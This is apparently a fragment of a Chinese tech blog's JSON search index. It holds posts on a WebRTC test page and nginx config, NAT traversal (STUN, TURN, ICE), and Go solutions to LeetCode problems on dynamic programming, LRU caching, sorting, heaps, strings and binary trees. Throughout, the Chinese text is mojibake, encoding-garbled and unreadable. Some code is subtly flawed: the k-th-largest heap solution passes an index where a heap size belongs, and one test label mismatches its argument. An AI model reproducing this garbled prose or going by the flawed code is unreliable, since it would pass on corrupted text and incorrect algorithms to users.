id=\"remoteVideos\"></div>\n</body>\n</html>\n```\n\n\n\nnginxé…ç½®:\n\n```nginx\nserver {\n        listen 8080 default_server;\n        listen [::]:8080 default_server;\n\n        root /home/liuwei/web;\n        index index.html;\n}\n```\n\n+ æ‰“å¼€firefoxå¼€å§‹æµ‹è¯•  http://207.246.80.69:8080, chromeéœ€è¦https\n\n+ http://simplewebrtc.com/latest-v3.js å¯èƒ½ä¸¢å¤±, å‚è€ƒhttps://github.com/andyet/SimpleWebRTC/blob/gh-pages/latest-v3.js\n\n+ å…¶ä¸­urlæ˜¯ä¿¡ä»¤æœåŠ¡å™¨çš„åœ°å€ã€nicknameã€roomidæ ¹æ®éœ€è¦ä¿®æ”¹\n\n  \n\n  \n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://www.cnblogs.com/yubaolee/p/webrtc.html\n\n+ https://blog.csdn.net/csj6346/article/details/81455663","tags":["webrtc"],"categories":["javascript"]},{"title":"natç©¿é€,stun,turn,iceä»‹ç»","url":"%2Fp%2Ff3e0f5f5.html","content":"\n### 1. NATç½‘ç»œåœ°å€è½¬æ¢:  \n\nèµ„æ–™: https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2\n\n\n\nå®Œå…¨åœ†é”¥å‹NAT( Full Cone NAT )\n\nåœ°å€é™åˆ¶åœ†é”¥å‹NAT( Address Restricted Cone NAT )\n\nç«¯å£é™åˆ¶åœ†é”¥å‹NAT( Port Restricted Cone NAT ) \n\nå¯¹ç§°å‹NAT( Symmetric NAT)\n\n<!-- more -->\n\n### 2. STUN(Session Traversal Utilities for NAT)\n\nèµ„æ–™: <https://zh.wikipedia.org/wiki/STUN>\n\n\n\nSTUNï¼ŒNATä¼šè¯ç©¿è¶Šåº”ç”¨ç¨‹åº <https://tools.ietf.org/html/rfc5389>ï¼‰æ˜¯ä¸€ç§[ç½‘ç»œåè®®](https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE)ï¼Œå®ƒå…è®¸ä½äº[NAT](https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2)ï¼ˆæˆ–å¤šé‡NATï¼‰åçš„å®¢æˆ·ç«¯æ‰¾å‡ºè‡ªå·±çš„å…¬ç½‘åœ°å€ï¼ŒæŸ¥å‡ºè‡ªå·±ä½äºå“ªç§ç±»å‹çš„NATä¹‹åä»¥åŠNATä¸ºæŸä¸€ä¸ªæœ¬åœ°ç«¯å£æ‰€ç»‘å®šçš„Internetç«¯ç«¯å£ã€‚è¿™äº›ä¿¡æ¯è¢«ç”¨æ¥åœ¨ä¸¤ä¸ªåŒæ—¶å¤„äºNATè·¯ç”±å™¨ä¹‹åçš„ä¸»æœºä¹‹é—´åˆ›å»ºUDPé€šä¿¡ã€‚è¯¥åè®®ç”±RFC 5389å®šä¹‰ã€‚\n\nå››ç§ä¸»è¦ç±»å‹ä¸­æœ‰ä¸‰ç§æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼š[å®Œå…¨åœ†é”¥å‹NAT](https://zh.wikipedia.org/w/index.php?title=%E5%AE%8C%E5%85%A8%E5%9C%86%E9%94%A5%E5%9E%8BNAT&action=edit&redlink=1)ã€[å—é™åœ†é”¥å‹NAT](https://zh.wikipedia.org/w/index.php?title=%E5%8F%97%E9%99%90%E5%9C%86%E9%94%A5%E5%9E%8BNAT&action=edit&redlink=1)å’Œ[ç«¯å£å—é™åœ†é”¥å‹NAT](https://zh.wikipedia.org/w/index.php?title=%E7%AB%AF%E5%8F%A3%E5%8F%97%E9%99%90%E5%9C%86%E9%94%A5%E5%9E%8BNAT&action=edit&redlink=1)â€”â€”ä½†å¤§å‹å…¬å¸ç½‘ç»œä¸­ç»å¸¸é‡‡ç”¨çš„å¯¹ç§°å‹NATï¼ˆåˆç§°ä¸ºåŒå‘NATï¼‰åˆ™ä¸èƒ½ä½¿ç”¨ã€‚\n\n\n\n### 3. TURN(Traversal Using Relay NAT)\n\nèµ„æ–™:  <https://zh.wikipedia.org/wiki/TURN>\n\n\n\nTURNï¼ˆ <https://tools.ietf.org/html/rfc5766>ï¼‰ï¼Œæ˜¯ä¸€ç§æ•°æ®ä¼ è¾“åè®®ï¼ˆdata-transfer protocolï¼‰ã€‚å…è®¸åœ¨TCPæˆ–UDPçš„è¿åœ¨çº¿è·¨è¶Š[NAT](https://zh.wikipedia.org/wiki/NAT)æˆ–[é˜²ç«å¢™](https://zh.wikipedia.org/wiki/%E9%98%B2%E7%81%AB%E5%A2%99)ã€‚\n\n\n\n### 4. ICE(Interactive Connectivity Establishment) \n\nèµ„æ–™: https://zh.wikipedia.org/wiki/%E4%BA%92%E5%8B%95%E5%BC%8F%E9%80%A3%E6%8E%A5%E5%BB%BA%E7%AB%8B>\n\n\n\niceæ˜¯ä¸€ç§ç»¼åˆæ€§çš„[NATç©¿è¶Š](https://zh.wikipedia.org/wiki/NAT%E7%A9%BF%E8%B6%8A)çš„æŠ€æœ¯, æ˜¯ç”±[IETF](https://zh.wikipedia.org/wiki/IETF)çš„MMUSICå·¥ä½œç»„å¼€å‘å‡ºæ¥çš„ä¸€ç§frameworkï¼Œå¯é›†æˆå„ç§[NATç©¿é€](https://zh.wikipedia.org/wiki/NAT%E7%A9%BF%E9%80%8F)æŠ€æœ¯ï¼Œå¦‚[STUN](https://zh.wikipedia.org/wiki/STUN)ã€[TURN](https://zh.wikipedia.org/wiki/TURN)ï¼ˆTraversal Using Relay NATï¼Œä¸­ç»§NATå®ç°çš„ç©¿é€ï¼‰ã€RSIPï¼ˆRealm Specific IPï¼Œç‰¹å®šåŸŸIPï¼‰ç­‰ã€‚è¯¥frameworkå¯ä»¥è®©SIPçš„å®¢æˆ·ç«¯åˆ©ç”¨å„ç§NATç©¿é€æ–¹å¼æ‰“ç©¿è¿œç¨‹çš„[é˜²ç«å¢™](https://zh.wikipedia.org/wiki/%E9%98%B2%E7%81%AB%E5%A2%99)ã€‚\n\n\n\n### 5. ä¸‰ä¸ªåè®®ä»‹ç»\n\nèµ„æ–™:  <https://blog.csdn.net/byxdaz/article/details/52786600>  \n","tags":["nat"],"categories":["ç³»ç»Ÿ"]},{"title":"7ç®—æ³•-åŠ¨æ€è§„åˆ’","url":"%2Fp%2Fa80d0031.html","content":"\n\n\n# 1. åŠ¨æ€è§„åˆ’\n\nçœ‹ä¸ªå°æ•…äº‹:\n\n```\n*writes down \"1+1+1+1+1+1+1+1 =\" on a sheet of paper*\n\n\"What's that equal to?\"\n\n*counting* \"Eight!\"\n\n*writes down another \"1+\" on the left*\n\n\"What about that?\"\n\n*quickly* \"Nine!\"\n\n\"How'd you know it was nine so fast?\"\n\n\"You just added one more\"\n\n\"So you didn't need to recount because you remembered there were eight!Dynamic Programming is just a fancy way to say 'remembering stuff to save time later'\"\n```\n\n<!-- more -->\n\næŒ‰ç…§å®šä¹‰ï¼ŒåŠ¨æ€è§„åˆ’æ˜¯æŠŠä¸€ä¸ªå¤§é—®é¢˜æ‹†è§£æˆä¸€å †å°é—®é¢˜ï¼Œè¿™ä¸ªæœ¬èº«æ²¡å•¥é—®é¢˜ï¼Œä½†æ˜¯æˆ‘è§‰å¾—çš„è¿™ä¸ªä¸æ˜¯åŠ¨æ€è§„åˆ’çš„æ ¸å¿ƒæ€æƒ³ï¼Œæˆ–è€…è¯´ï¼Œä¸€ä¸ªâ€å¤§é—®é¢˜â€œä¹‹æ‰€ä»¥èƒ½ç”¨â€åŠ¨æ€è§„åˆ’â€œè§£å†³ï¼Œå¹¶ä¸æ˜¯å› ä¸ºå®ƒèƒ½æ‹†è§£æˆä¸€å †å°é—®é¢˜ï¼Œäº‹å®ä¸Šå•¥å¤§é—®é¢˜éƒ½èƒ½æ‹†è§£æˆå°é—®é¢˜...\n\n**å–å†³äºè¯¥é—®é¢˜æ˜¯å¦èƒ½ç”¨åŠ¨æ€è§„åˆ’è§£å†³çš„æ˜¯è¿™äº›â€å°é—®é¢˜â€œä¼šä¸ä¼šè¢«è¢«é‡å¤è°ƒç”¨ã€‚**\n\n\n\n# 2. ç®—æ³•\n\n### 2.1 [è¿ç»­å­æ•°ç»„çš„æœ€å¤§å’Œ](https://leetcode-cn.com/problems/lian-xu-zi-shu-zu-de-zui-da-he-lcof/)(ç®€å•)\n\n+ åŠ¨æ€è§„åˆ’, ç”¨åˆ°ä¸´æ—¶å­˜ç»“æœ\n\n+ ä¸´æ—¶ç»“æœ, æœ‰å‰å› åæœå…³ç³», æƒ³æƒ³8+1\n\n```go\nfunc maxSubArray(nums []int) int {\n    dp := make([]int, len(nums))\n    dp[0] = nums[0]\n    max := dp[0]\n    for i := 1; i < len(nums); i++ {\n        dp[i] = Max(dp[i-1]+nums[i], nums[i])\n        max = Max(dp[i], max)\n    }\n    return max\n}\n\nfunc Max(a, b int) int {\n    if a < b {\n        return b\n    }\n    return a\n}\n```\n\n### 2.2 [é’è›™è·³å°é˜¶é—®é¢˜](https://leetcode-cn.com/problems/qing-wa-tiao-tai-jie-wen-ti-lcof/)(ç®€å•)\n\n+ é€’å½’è¶…æ—¶\n\n```go\nfunc numWays(n int) int {\n    if n <= 1 {\n        return 1\n    }\n    dp := make([]int,n+1)\n    dp[0]= 1\n    dp[1]= 1\n\n    for i:=2; i <= n; i++{\n        dp[i] = (dp[i-1] + dp[i-2])%1000000007\n    }\n\n    return dp[n]\n}\n```\n\n\n\n### 2.3 [æ–æ³¢é‚£å¥‘æ•°åˆ—](https://leetcode-cn.com/problems/fei-bo-na-qi-shu-lie-lcof/)(ç®€å•)\n\n```go\nfunc fib(n int) int {\n    if n <= 1 {\n        return n\n    }\n\n    f1, f2 := 0, 1\n    for i := 2; i <= n; i++{\n        temp := (f1 + f2)%1000000007\n        f1 = f2\n        f2 = temp\n    }\n\n    return f2\n}\n```\n\n\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://www.zhihu.com/question/39948290/answer/612439961\n","tags":["ç®—æ³•"],"categories":["ç®—æ³•"]},{"title":"6ç®—æ³•-ç»¼åˆ","url":"%2Fp%2Fb4481ffc.html","content":"\n### 1. [LRU ç¼“å­˜æœºåˆ¶](https://leetcode-cn.com/problems/lru-cache/)(ä¸­ç­‰)\n\n```go\ntype LRUCache struct {\n    Capacity int\n    Map map[int]int\n    List []int\n}\n\n\nfunc Constructor(capacity int) LRUCache {\n  return LRUCache{\n        Capacity : capacity,\n        Map : make(map[int]int, 0),\n        List : make([]int, 0),\n    }\n}\n\nfunc DelKey(a []int, key int) []int{\n    for i := 0; i < len(a); i++ {\n\t\tif a[i] == key {\n            return append(a[:i], a[i+1:]...)\n\t\t}\n\t}\n\treturn a[1:len(a)]\n}\n\nfunc (this *LRUCache) Get(key int) int {\n    if val, ok := this.Map[key]; ok{\n        this.List = DelKey(this.List, key)\n        this.List = append(this.List, key)\n        return val\n    }\n    return -1\n}\n\n\nfunc (this *LRUCache) Put(key int, value int)  {\n\n    if _, ok := this.Map[key]; ok{\n        this.Map[key] = value\n        this.List = DelKey(this.List, key)\n        this.List = append(this.List, key)\n        return \n    }\n\n    if len(this.Map) >= this.Capacity{\n        delKey := this.List[0]      \n        this.List = DelKey(this.List, key)\n        delete(this.Map, delKey)\n    }\n\n    this.Map[key] = value\n    this.List = append(this.List, key)\n}\n```\n\n<!-- more -->\n\n### 2. [ é¡ºæ—¶é’ˆæ‰“å°çŸ©é˜µ](https://leetcode-cn.com/problems/shun-shi-zhen-da-yin-ju-zhen-lcof/)\n\n```go\nfunc spiralOrder(matrix [][]int) []int {\n    if len(matrix) == 0 || len(matrix[0]) == 0{\n        return []int{}\n    }\n\n    res := []int{}\n    l := 0\n    r := len(matrix[0]) - 1\n    t := 0\n    b :=  len(matrix) - 1\n\n    for {\n        // å·¦åˆ°å³\n        for i := l ; i <= r; i++ {\n            res = append(res, matrix[t][i])\n        }\n        t++\n        if t > b {\n           break \n        }\n\n        // å³åˆ°ä¸‹\n        for i := t; i <= b; i++ {\n            res = append(res, matrix[i][r])\n        }\n\n        r--\n        if l > r {\n            break\n        }\n\n        // ä¸‹åˆ°å·¦\n        for i := r; i >= l; i-- {\n            res = append(res, matrix[b][i])\n        }\n        b--\n        if t > b {\n           break \n        }\n\n\n        // å·¦åˆ°ä¸Š\n        for i := b; i >= t; i-- {\n            res = append(res, matrix[i][l])\n        }\n        l++\n        if l > r {\n            break\n        }\n    }\n\n    return res\n}\n```\n\n\n\n### 3. [æ¯æ—¥æ¸©åº¦](https://leetcode-cn.com/problems/daily-temperatures/)(ä¸­ç­‰)TODO\n\n","tags":["ç®—æ³•"],"categories":["ç®—æ³•"]},{"title":"5ç®—æ³•-æŸ¥æ‰¾æ’åºTOPK","url":"%2Fp%2Fb24fd949.html","content":"\n# 1. æŸ¥æ‰¾\n\n### 1 [äºŒåˆ†æŸ¥æ‰¾](https://leetcode-cn.com/problems/binary-search/)(ç®€å•) \n\n+ ï¼ˆå¤–é¢å°äºç­‰äºï¼Œé‡Œé¢å°äºï¼Œå’Œå¿«æ’ç›¸åï¼‰\n\n```go\nfunc search(nums []int, target int) int {    \n    left := 0 \n    right := len(nums)-1\n  \n    for left <= right {  // è¿™é‡Œæ˜¯å°äºç­‰äº\n        mid := (left + right)/2\n        if nums[mid] > target{\n            right = mid - 1 \n        }else if nums[mid] < target{\n          left = mid  + 1\n        }else {\n         return mid\n        }\n    }\n    return -1 // æ‰¾ä¸åˆ° return -1\n}\n```\n\n<!-- more -->\n\n\n# 2. æ’åº\n\n### 1 å¿«é€Ÿæ’åº\n\n+ https://www.liuvv.com/p/ff8068c0.html\n\n+ https://leetcode-cn.com/problems/sort-an-array/\n\n+ ï¼ˆå¾ªç¯å¥—å¾ªç¯ï¼‰ï¼ˆå¤–å±‚å°äºï¼Œé‡Œå±‚å°äºç­‰äºï¼Œå’ŒäºŒåˆ†ç›¸åï¼‰ï¼ˆåœæ­¢ç›¸é‡è¦äº¤æ¢ï¼‰\n\n  ```go\n  func main() {\n  \tarr := []int{2, 1}\n  \tfmt.Println(\"origin\", arr)\n  \tQuickSort(arr, 0, len(arr)-1)\n  \tfmt.Println(\"sort\", arr)\n  }\n  \n  func QuickSort(arr []int, left int, right int) {\n  \tif left < right {\n  \t\tpartIndex := PartIndex(arr, left, right)\n  \t\tQuickSort(arr, left, partIndex-1)\n  \t\tQuickSort(arr, partIndex+1, right)\n  \t}\n  }\n  \n  func PartIndex(arr []int, left int, right int) int {\n  \tmid := arr[left]\n  \torigin := left\n  \tfor left < right {\n  \t\tfor arr[right] >= mid && left < right {\n  \t\t\tright--\n  \t\t}\n  \t\tfor arr[left] <= mid && left < right {\n  \t\t\tleft++\n  \t\t}\n  \t\tarr[left], arr[right] = arr[right], arr[left]\n  \t}\n  \n  \tarr[left], arr[origin] = arr[origin], arr[left]\n  \treturn left\n  }\n  ```\n\n\n\n### 2 å †æ’åº\n\n+ https://www.bilibili.com/video/BV1Eb41147dK\n+ https://www.bilibili.com/video/BV1fp4y1D7cj\n\nå †æ˜¯ä¸€ä¸ªè¿‘ä¼¼å®Œå…¨äºŒå‰æ ‘çš„ç»“æ„ï¼Œå¹¶åŒæ—¶æ»¡è¶³å †ç§¯çš„æ€§è´¨ï¼šå³å­ç»“ç‚¹çš„é”®å€¼æˆ–ç´¢å¼•æ€»æ˜¯å°äºï¼ˆæˆ–è€…å¤§äºï¼‰å®ƒçš„çˆ¶èŠ‚ç‚¹ã€‚æœ€å¤§å †é€šå¸¸è¢«ç”¨æ¥è¿›è¡Œ\"å‡åº\"æ’åºï¼Œè€Œæœ€å°å †é€šå¸¸è¢«ç”¨æ¥è¿›è¡Œ\"é™åº\"æ’åºã€‚\n\n##### 1. å…ˆç»´æŠ¤å †æ€§è´¨çš„å‡½æ•°\n\nä¸è‡ªå·±çš„å­©å­äº¤æ¢ï¼Œäº¤æ¢åé€’å½’äº¤æ¢ã€‚\n\n<img src=\"5ç®—æ³•-æŸ¥æ‰¾æ’åºTOPK/alg-sort-heap-1.jpg\" alt=\"img\" style=\"zoom:80%;\" />\n\n##### 2. å†æ„å»ºå¤§é¡¶å †\n\nå°†å¾…æ’åºçš„åºåˆ—å»ºæˆå¤§æ ¹å †ã€‚\n\néœ€è¦æœ‰ç»´æŠ¤å †æ€§è´¨çš„å‡½æ•°ï¼Œä»åå¾€å‰è°ƒç”¨æ„å»ºå †å°±å¯ä»¥äº†ã€‚\n\n##### 3. ä¸åœäº¤æ¢è¾¾åˆ°å †æ’åº\n\n1. æˆ‘ä»¬å°†å †é¡¶å…¶ä¸æœ«å°¾å…ƒç´ äº¤æ¢ï¼Œä½¿æœ«å°¾å…ƒç´ ä¸ºæœ€å¤§å€¼ï¼Œç„¶åå†è°ƒæ•´å †é¡¶å…ƒç´ ä½¿å¾—å‰©ä¸‹çš„ nâˆ’1 ä¸ªå…ƒç´ ä»ä¸ºå¤§æ ¹å †\n\n2. å†é‡å¤ 2 çš„æ“ä½œæˆ‘ä»¬å³èƒ½å¾—åˆ°ä¸€ä¸ªæœ‰åºçš„åºåˆ—ã€‚\n\n   \n\n```go\npackage main\n\nimport \"fmt\"\n\n// 1. ç»´æŠ¤å †çš„æ€§è´¨\nfunc heap(arr []int, length int, index int) {\n\tmaxIndex := index\n\tlChildIndex := 2*index + 1\n\trChildIndex := 2*index + 2\n\n\tif lChildIndex < length && arr[lChildIndex] > arr[maxIndex] {\n\t\tmaxIndex = lChildIndex\n\t}\n\tif rChildIndex < length && arr[rChildIndex] > arr[maxIndex] {\n\t\tmaxIndex = rChildIndex\n\t}\n\tif maxIndex != index { // è¯´æ˜å­©å­æœ‰æ¯”è‡ªå·±å¤§çš„\n\t\tarr[maxIndex], arr[index] = arr[index], arr[maxIndex]\n\t\theap(arr, length, maxIndex)\n\t}\n}\n\nfunc main() {\n\tarr := []int{2, 1, 10, 9, 10, 88, 17}\n\tfmt.Println(\"origin\", arr) //[2 1 10 9 10 88 17]\n\n\t// 2. æ„å»ºå¤§é¡¶å †\n\tlength := len(arr)\n\tfor i := (length - 1) / 2; i >= 0; i-- {\n\t\theap(arr, length, i)\n\t}\n\tfmt.Println(\"heap\", arr) // [88 10 17 9 1 10 2]\n\n\t// 3. å †æ’åº\n\tfor i := length - 1; i >= 0; i-- {\n\t\tarr[i], arr[0] = arr[0], arr[i]\n\t\theap(arr, i, 0)\n\t}\n\tfmt.Println(\"heap_sort\", arr) // [1 2 9 10 10 17 88]\n}\n\n\n```\n\n\n\n# 3  TopK\n\n> å‚è€ƒå †æ’åºä»£ç ï¼Œå…ˆå»ºå †ã€‚\n\n### 1 [æœ€å°çš„kä¸ªæ•°](https://leetcode-cn.com/problems/zui-xiao-de-kge-shu-lcof/)(ç®€å•ğŸ”¥) [æœ€å°Kä¸ªæ•°](https://leetcode-cn.com/problems/smallest-k-lcci/)(ä¸­ç­‰)\n\nä½¿ç”¨å¤§é¡¶å †ï¼Œå’Œå †é¡¶æ¯”è¾ƒï¼Œå †é¡¶å¤§å°±ç›´æ¥æ¢æ‰ï¼Œæ¥ä¸‹æ¥è¿™ä¸ªå †å°±æ˜¯æ•°å­—æœ€å°çš„å¤§é¡¶å †ã€‚\n\n```go\npackage main\n\nimport \"fmt\"\n\n// å»ºå †\nfunc buildHeap(arr []int, size int) {\n\tfor i := size / 2; i >= 0; i-- {\n\t\theapify(arr, i, size)\n\t}\n}\n\n// ç»´æŠ¤å †\nfunc heapify(arr []int, index int, length int) {\n\tl := index*2 + 1\n\tr := index*2 + 2\n\n\tmaxIndex := index\n\tif l < length && arr[l] > arr[maxIndex] {\n\t\tmaxIndex = l\n\t}\n\tif r < length && arr[r] > arr[maxIndex] {\n\t\tmaxIndex = r\n\t}\n\n\tif maxIndex != index {\n\t\tarr[maxIndex], arr[index] = arr[index], arr[maxIndex]\n\t\theapify(arr, maxIndex, length)\n\t}\n}\n\nfunc getLeastNumbers(arr []int, k int) []int {\n\n\tbuildHeap(arr, k)\n\n\tfor i := k; i < len(arr); i++ {\n\t\tif arr[i] < arr[0] {\n\t\t\tarr[i], arr[0] = arr[0], arr[i]\n\t\t\theapify(arr, 0, k)\n\t\t}\n\t}\n\tvar res []int\n\tfor i := 0; i < k; i++ {\n\t\tres = append(res, arr[i])\n\t}\n\treturn res\n\n}\n\nfunc main() {\n\tarr := []int{2, 1, 10, 9, 10, 88, 17}\n\tfmt.Println(\"least4\", getLeastNumbers(arr, 3)) // 9 1 2\n\tfmt.Println(\"least2\", getLeastNumbers(arr, 2)) // 2 1\n}\n```\n\n\n\n### 2 [æ•°ç»„ä¸­çš„ç¬¬Kä¸ªæœ€å¤§å…ƒç´ ](https://leetcode-cn.com/problems/kth-largest-element-in-an-array/)(ä¸­ç­‰ğŸ”¥)\n\nä½¿ç”¨çš„å¤§é¡¶å †, éœ€è¦å…¨å…¥å †\n\n```go\nfunc buildHeap(arr []int, size int) {\n\tfor i := size / 2; i >= 0; i-- {\n\t\theapify(arr, i, size)\n\t}\n}\n\nfunc heapify(arr []int, index int, length int) {\n\tl := index*2 + 1\n\tr := index*2 + 2\n\n\ttemp := index\n\tif l < length && arr[l] > arr[temp] {\n\t\ttemp = l\n\t}\n\tif r < length && arr[r] > arr[temp] {\n\t\ttemp = r\n\t}\n\n\tif temp != index {\n\t\tarr[temp], arr[index] = arr[index], arr[temp]\n\t\theapify(arr, temp, length)\n\t}\n}\n\n\n\nfunc findKthLargest(nums []int, k int) int {\n\tbuildHeap(nums, len(nums))\n\n\tlength := len(nums) - 1\n\tfor i := 0; i < k; i++ {\n\t\tnums[0], nums[length] = nums[length], nums[0]\n\t\tlength--\n\t\theapify(nums, 0, length)\n\t}\n\treturn nums[len(nums)-k]\n}\n```\n\n\n\n### 3 [å‰ K ä¸ªé«˜é¢‘å…ƒç´ ](https://leetcode-cn.com/problems/top-k-frequent-elements/)(ä¸­ç­‰)TODO\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://lyl0724.github.io/2020/01/25/1/","tags":["ç®—æ³•"],"categories":["ç®—æ³•"]},{"title":"4ç®—æ³•-å­—ç¬¦ä¸²","url":"%2Fp%2Fb50adb48.html","content":"\n### + [ ç¿»è½¬å•è¯é¡ºåº](https://leetcode-cn.com/problems/fan-zhuan-dan-ci-shun-xu-lcof/)(ç®€å•)\n\n```go\nfunc reverseWords(s string) string {\n\n    s = strings.TrimSpace(s)\n\n    j := len(s)-1\n    i := j\n    res := []string{}\n    for i >= 0 {\n        for i >= 0 &&  s[i] != ' '{\n            i--\n        }\n        res = append(res, s[i+1:j+1])\n        for i >= 0 &&  s[i] == ' '{\n            i--\n        }\n        j = i\n\n    }\n\n    return strings.Join(res,\" \")\n}\n```\n\n### + [ç½—é©¬æ•°å­—è½¬æ•´æ•°](https://leetcode-cn.com/problems/roman-to-integer/)(ç®€å•)\n\n```go\nfunc romanToInt(s string) int {\n  res := map[string]int{\n        \"I\": 1,\n        \"V\": 5,\n        \"X\": 10,\n        \"L\": 50,\n        \"C\": 100,\n        \"D\": 500,\n        \"M\": 1000,\n    }\n    sum := 0\n    for i := 0; i < len(s); i++ {\n        val := res[string(s[i])]\n        if i < len(s)-1 && val < res[string(s[i+1])] {\n            sum -= val\n        } else {\n            sum += val\n        }\n    }\n    return sum\n}\n```\n\n","tags":["ç®—æ³•"],"categories":["ç®—æ³•"]},{"title":"3ç®—æ³•-æ ‘","url":"%2Fp%2F3850b4cc.html","content":"\n\n\n> ä¸¤ä¸ªå¥—è·¯ï¼Œä¸€ä¸ªæ˜¯é€’å½’éå†äºŒå‰æ ‘traverse() æ— è¿”å›å€¼ ï¼Œä¸€ä¸ªæ˜¯åˆ†è§£å¤„ç†å­æ•°ï¼Œæœ‰è¿”å›å€¼ã€‚\n\nç»¼ä¸Šï¼Œé‡åˆ°ä¸€é“äºŒå‰æ ‘çš„é¢˜ç›®æ—¶çš„é€šç”¨æ€è€ƒè¿‡ç¨‹æ˜¯ï¼š\n\n**1ã€æ˜¯å¦å¯ä»¥é€šè¿‡éå†ä¸€éäºŒå‰æ ‘å¾—åˆ°ç­”æ¡ˆ**ï¼Ÿå¦‚æœå¯ä»¥ï¼Œç”¨ä¸€ä¸ª `traverse` å‡½æ•°é…åˆå¤–éƒ¨å˜é‡æ¥å®ç°ã€‚\n\n**2ã€æ˜¯å¦å¯ä»¥å®šä¹‰ä¸€ä¸ªé€’å½’å‡½æ•°ï¼Œé€šè¿‡å­é—®é¢˜ï¼ˆå­æ ‘ï¼‰çš„ç­”æ¡ˆæ¨å¯¼å‡ºåŸé—®é¢˜çš„ç­”æ¡ˆ**ï¼Ÿå¦‚æœå¯ä»¥ï¼Œå†™å‡ºè¿™ä¸ªé€’å½’å‡½æ•°çš„å®šä¹‰ï¼Œå¹¶å……åˆ†åˆ©ç”¨è¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼ã€‚\n\n**3ã€æ— è®ºä½¿ç”¨å“ªä¸€ç§æ€ç»´æ¨¡å¼ï¼Œä½ éƒ½è¦æ˜ç™½äºŒå‰æ ‘çš„æ¯ä¸€ä¸ªèŠ‚ç‚¹éœ€è¦åšä»€ä¹ˆï¼Œéœ€è¦åœ¨ä»€ä¹ˆæ—¶å€™ï¼ˆå‰ä¸­ååºï¼‰åš**ã€‚\n\n<!-- more -->\n\n# 1. å¸¸è€ƒ\n\n### 1.1 äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦\n\n+ https://leetcode.cn/problems/maximum-depth-of-binary-tree/\n+ éå†äºŒå‰æ ‘\n\n```go\n\nvar res int // è®°å½•æœ€å¤§æ·±åº¦\nvar depth int // è®°å½•éå†åˆ°çš„èŠ‚ç‚¹çš„æ·±åº¦\n\n\nfunc maxDepth(root *TreeNode) int {\n\ttraverse(root)\n\treturn res\n}\n\nfunc traverse(root *TreeNode) {\n\tif root == nil {\n\t\treturn\n\t}\n\tdepth++\n\tif root.Left == nil && root.Right == nil {\n\t\tres = max(res, depth) \t\t// åˆ°è¾¾å¶å­èŠ‚ç‚¹ï¼Œæ›´æ–°æœ€å¤§æ·±åº¦\n\t}\n\ttraverse(root.Left)\n\ttraverse(root.Right)\n\tdepth--\n}\n\nfunc max(a, b int) int {\n\tif a > b {\n\t\treturn a\n\t}\n\treturn b\n}\n```\n\n+ åˆ†è§£é—®é¢˜\n\n```go\nfunc maxDepth(root *TreeNode) int {\n    if root == nil {\n        return 0\n    }\n\n    left := maxDepth(root.Left)\n    right := maxDepth(root.Right)\n    return Max(left,right)+1\n}\n// ä½†ä¸ºä»€ä¹ˆä¸»è¦çš„ä»£ç é€»è¾‘é›†ä¸­åœ¨ååºä½ç½®ï¼Ÿ\n// é€šè¿‡å­æ ‘çš„æœ€å¤§æ·±åº¦æ¨å¯¼å‡ºåŸæ ‘çš„æ·±åº¦ï¼Œæ‰€ä»¥å½“ç„¶è¦é¦–å…ˆåˆ©ç”¨é€’å½’å‡½æ•°çš„å®šä¹‰ç®—å‡ºå·¦å³å­æ ‘çš„æœ€å¤§æ·±åº¦ï¼Œç„¶åæ¨å‡ºåŸæ ‘çš„æœ€å¤§æ·±åº¦ï¼Œä¸»è¦é€»è¾‘è‡ªç„¶æ”¾åœ¨ååºä½ç½®ã€‚\n\nfunc Max(a, b int) int{\n    if a > b {\n        return a\n    }\n    return b\n}\n```\n\n\n\n### 1.2 åˆ¤æ–­å¹³è¡¡äºŒå‰æ ‘ ğŸ”¥\n\n+ https://leetcode.cn/problems/balanced-binary-tree/\n\n```go\nfunc isBalanced(root *TreeNode) bool {\n    if root == nil{\n        return true\n    }\n    if !isBalanced(root.Left) || !isBalanced(root.Right){\n        return false\n    }\n    if abs(maxDepth(root.Left)-maxDepth(root.Right)) > 1 {\n        return false\n    }\n    return true\n}\n\nfunc maxDepth(root *TreeNode) int {\n    if root == nil {\n        return 0\n    }\n    return max(maxDepth(root.Left),maxDepth(root.Right)) + 1\n}\n\nfunc max(a,b int) int {\n    if a > b {\n        return a\n    }\n    return b\n}\n\nfunc abs(a int) int {\n    if a < 0 {\n        return -a\n    }\n    return a \n}\n```\n\n\n\n### 1.3 ç¿»è½¬äºŒå‰æ ‘ğŸ”¥\n\n+ https://leetcode.cn/problems/invert-binary-tree/\n\n+ brewä½œè€…å¤±è´¥çš„é¢˜\n\n```go\nfunc mirrorTree(root *TreeNode) *TreeNode {\n    if root == nil{\n        return nil\n    }\n\n    left := mirrorTree(root.Left)\n    right := mirrorTree(root.Right)\n    root.Left = right\n    root.Right = left\n    return root\n}\n```\n\n\n\n\n\n# 2. å…¶ä»–\n\n### 2.1 äºŒå‰æ ‘çš„ç›´å¾„\n\n+ https://leetcode.cn/problems/diameter-of-binary-tree/\n\n**æ¯ä¸€æ¡äºŒå‰æ ‘çš„ã€Œç›´å¾„ã€é•¿åº¦ï¼Œå°±æ˜¯ä¸€ä¸ªèŠ‚ç‚¹çš„å·¦å³å­æ ‘çš„æœ€å¤§æ·±åº¦ä¹‹å’Œ**ã€‚\n\n\n\n\n\n### + [é‡å»ºäºŒå‰æ ‘](https://leetcode-cn.com/problems/zhong-jian-er-cha-shu-lcof/)(ä¸­ç­‰)\n\n+ ç”»å›¾, len(preorder[:pos])  æ˜¯å·¦å­æ ‘çš„é•¿åº¦\n\n```go\nfunc buildTree(preorder []int, inorder []int) *TreeNode {\n    if len(preorder) == 0{\n        return nil \n    }\n\n    root := &TreeNode{preorder[0],nil,nil}\n    pos := 0\n    for ; pos < len(inorder); pos++{\n        if inorder[pos] == preorder[0]{\n            break\n        }\n    }\n\n    root.Left = buildTree(preorder[1:len(preorder[:pos])+1],inorder[:pos]) \n    root.Right =  